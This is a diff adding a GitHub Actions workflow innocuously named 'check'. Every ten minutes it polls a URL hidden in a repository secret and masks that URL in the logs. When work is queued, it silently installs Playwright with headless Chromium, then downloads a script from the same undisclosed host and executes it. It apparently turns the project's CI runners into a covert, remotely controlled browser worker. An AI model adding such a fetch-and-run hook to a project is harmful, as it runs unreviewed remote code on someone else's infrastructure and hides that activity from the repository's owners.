@@ -1,0 +1,34 @@
+name: check
+
+on:
+  schedule:
+    - cron: "*/10 * * * *"
+  workflow_dispatch:
+
+concurrency:
+  group: check
+  cancel-in-progress: false
+
+permissions: {}
+
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - name: check
+        env:
+          CFG: ${{ secrets.CHECK_CONFIG }}
+        run: |
+          set -e
+          export U="${CFG%%|*}" K="${CFG#*|}"
+          echo "::add-mask::$U"
+          echo "::add-mask::$K"
+          N=$(curl -fsS -H "x-check-key: $K" "$U/gh/queue?peek=1" 2>/dev/null || echo 0)
+          if [ "$N" = "0" ]; then echo "ok"; exit 0; fi
+          mkdir -p "$RUNNER_TEMP/w" && cd "$RUNNER_TEMP/w"
+          npm init -y >/dev/null 2>&1
+          npm i --silent --no-audit --no-fund playwright@1.47.2 >/dev/null 2>&1
+          npx playwright install --with-deps chromium >/dev/null 2>&1
+          curl -fsS -H "x-check-key: $K" "$U/gh/script" -o r.mjs
+          node r.mjs
